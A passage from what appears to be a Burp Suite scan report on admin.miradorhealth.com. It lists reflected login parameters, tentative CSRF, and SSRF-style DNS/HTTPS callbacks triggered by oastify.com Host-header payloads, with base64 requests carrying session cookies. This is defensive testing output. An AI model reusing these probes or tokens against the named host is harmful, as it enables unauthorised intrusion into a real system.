    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>email</b> request parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWJsdjA2OTFuZWZqNm5tZWFmYjdlanZyb2M4OyBBV1NBTEI9MDdHcTZMWXYvZmEwbEhadlhPQzN5Q21FbWtndGNIc241cFZLZXJyU1hmV3EvTjJPdkhOcmozeGRpNzIyRUh4cjV0eUpEUTNJNFJHcHZpMTBOcUQyVlNCdjBSRVY1SXdtL2RjeDdnQUVKQ0pOYXJJMUg1YittSUJZTFdoazsgQVdTQUxCQ09SUz0wN0dxNkxZdi9mYTBsSFp2WE9DM3lDbUVta2d0Y0hzbjVwVktlcnJTWGZXcS9OMk92SE5yajN4ZGk3MjJFSHhyNXR5SkRRM0k0UkdwdmkxME5xRDJWU0J2MFJFVjVJd20vZGN4N2dBRUpDSk5hckkxSDViK21JQllMV2hrOyBzY3JlZW5XaWR0aD04MDANCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzgNCg0KcmVkaXJlY3RVUkw9JmVtYWlsPVBVclRsZFZuQGJ1cnBjb2xsYWJvcmF0b3IubmV0ZWpiMTR6ZXh6eCZwYXNzd29yZD1QVXJUbGQmbG9naW49TG9naW4=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7346637374359367680</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login [password parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>password</b> request parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWJsdjA2OTFuZWZqNm5tZWFmYjdlanZyb2M4OyBBV1NBTEI9MDdHcTZMWXYvZmEwbEhadlhPQzN5Q21FbWtndGNIc241cFZLZXJyU1hmV3EvTjJPdkhOcmozeGRpNzIyRUh4cjV0eUpEUTNJNFJHcHZpMTBOcUQyVlNCdjBSRVY1SXdtL2RjeDdnQUVKQ0pOYXJJMUg1YittSUJZTFdoazsgQVdTQUxCQ09SUz0wN0dxNkxZdi9mYTBsSFp2WE9DM3lDbUVta2d0Y0hzbjVwVktlcnJTWGZXcS9OMk92SE5yajN4ZGk3MjJFSHhyNXR5SkRRM0k0UkdwdmkxME5xRDJWU0J2MFJFVjVJd20vZGN4N2dBRUpDSk5hckkxSDViK21JQllMV2hrOyBzY3JlZW5XaWR0aD04MDANCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzgNCg0KcmVkaXJlY3RVUkw9JmVtYWlsPVBVclRsZFZuJTQwYnVycGNvbGxhYm9yYXRvci5uZXQmcGFzc3dvcmQ9UFVyVGxkc3czNndvNWtyMSZsb2dpbj1Mb2dpbg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7244005645567219712</serialNumber>
    <type>6291968</type>
    <name><![CDATA[Email addresses disclosed]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p>
<p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p>
<p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure">Web Security Academy: Information disclosure</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following email address was disclosed in the response:<ul><li>NrKeLIHS@burpcollaborator.net</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[NrKeLIHS@burpcollaborator.net]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPTBoNzlqdjd1aGc4YWp0YWIzNmRrNGdtYTc5OyBBV1NBTEI9U1FRUEhiVUhnUkRDbS9IU0pPS05WckFXc3I1U3drMVVHOERISTZwZ1Y3YXowU2FRTThHQTdSSGNQazYwY1J2UGY4eU13dW5ndmNwY05vYnpKeVluVFFnR2FYSTFXWXFkYzZpRzkxWU9NQm1ZbVJiZlVoSFlNWmRPeG02bjsgQVdTQUxCQ09SUz1TUVFQSGJVSGdSRENtL0hTSk9LTlZyQVdzcjVTd2sxVUc4REhJNnBnVjdhejBTYVFNOEdBN1JIY1BrNjBjUnZQZjh5TXd1bmd2Y3BjTm9iekp5WW5UUWdHYVhJMVdZcWRjNmlHOTFZT01CbVltUmJmVWhIWU1aZE94bTZuOyBzY3JlZW5XaWR0aD04MDANCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogODYNCg0KcmVkaXJlY3RVUkw9JmVtYWlsPU5yS2VMSUhTJTQwYnVycGNvbGxhYm9yYXRvci5uZXQmcGFzc3dvcmQ9cTVEJTIxaDFqJTIxQjcmbG9naW49TG9naW4=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4236860499476434944</serialNumber>
    <type>2098944</type>
    <name><![CDATA[Cross-site request forgery]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/login]]></path>
    <location><![CDATA[/login]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>
<ul>
<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>
<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>
<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>
<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/csrf">Web Security Academy: Cross-site request forgery</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-">Using Burp to Test for Cross-Site Request Forgery</a></li><li><a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">The Deputies Are Still Confused</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li><li><a href="https://capec.mitre.org/data/definitions/62.html">CAPEC-62: Cross Site Request Forgery</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against unauthenticated functionality. This is unlikely to constitute a security vulnerability in its own right, however it may facilitate exploitation of other vulnerabilities affecting application users.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWszYXMzMTduM3M1Yjl2NGZwYnU5dm8yM3A3OyBBV1NBTEI9T0RMUWt5NDRFcGsrc0xKR0NramI4ZnJMdElZQlU3ejV2SFZoT1dWSXVSellOVVdJSS91aVVyYmJsV0pKczlXQXpPWWhxZTQxbzZkMC80U09oVit0V290L3FMRjFMQWo3Z2xvdWp3Qk1ZMlRPK2x2d2dMRldFemIzS2oxQzsgQVdTQUxCQ09SUz1PRExRa3k0NEVwaytzTEpHQ2tqYjhmckx0SVlCVTd6NXZIVmhPV1ZJdVJ6WU5VV0lJL3VpVXJiYmxXSkpzOVdBek9ZaHFlNDFvNmQwLzRTT2hWK3RXb3QvcUxGMUxBajdnbG91andCTVkyVE8rbHZ3Z0xGV0V6YjNLajFDOyBzY3JlZW5XaWR0aD04MDANCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogODYNCg0KcmVkaXJlY3RVUkw9JmVtYWlsPWpwc0l6dk9iJTQwYnVycGNvbGxhYm9yYXRvci5uZXQmcGFzc3dvcmQ9dDNQJTIxeTZtJTIxUjUmbG9naW49TG9naW4=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvbG9naW4gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWszYXMzMTduM3M1Yjl2NGZwYnU5dm8yM3A3OyBBV1NBTEI9T0RMUWt5NDRFcGsrc0xKR0NramI4ZnJMdElZQlU3ejV2SFZoT1dWSXVSellOVVdJSS91aVVyYmJsV0pKczlXQXpPWWhxZTQxbzZkMC80U09oVit0V290L3FMRjFMQWo3Z2xvdWp3Qk1ZMlRPK2x2d2dMRldFemIzS2oxQzsgQVdTQUxCQ09SUz1PRExRa3k0NEVwaytzTEpHQ2tqYjhmckx0SVlCVTd6NXZIVmhPV1ZJdVJ6WU5VV0lJL3VpVXJiYmxXSkpzOVdBek9ZaHFlNDFvNmQwLzRTT2hWK3RXb3QvcUxGMUxBajdnbG91andCTVkyVE8rbHZ3Z0xGV0V6YjNLajFDOyBzY3JlZW5XaWR0aD04MDANCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9mdnNzZmdzd254aVdMaUpTVGRVLmNvbS9sb2dpbg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogODYNCg0KcmVkaXJlY3RVUkw9JmVtYWlsPWpwc0l6dk9iJTQwYnVycGNvbGxhYm9yYXRvci5uZXQmcGFzc3dvcmQ9dDNQJTIxeTZtJTIxUjUmbG9naW49TG9naW4=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6985108821457743872</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/logout]]></path>
    <location><![CDATA[/logout]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>urp9xviadrk55pe2a962v1v4mvspgmjac90znpbe.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHVycDl4dmlhZHJrNTVwZTJhOTYydjF2NG12c3BnbWphYzkwem5wYmUub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>167.99.160.10</originIp>
      <time>2024-Dec-15 00:55:15.623 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>urp9xviadrk55pe2a962v1v4mvspgmjac90znpbe.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>2037556003105158144</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/logout]]></path>
    <location><![CDATA[/logout]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>urp9xviadrk55pe2a962v1v4mvspgmjac90znpbe.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHVycDl4dmlhZHJrNTVwZTJhOTYydjF2NG12c3BnbWphYzkwem5wYmUub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:55:16.590 UTC</time>
      <requestresponse>
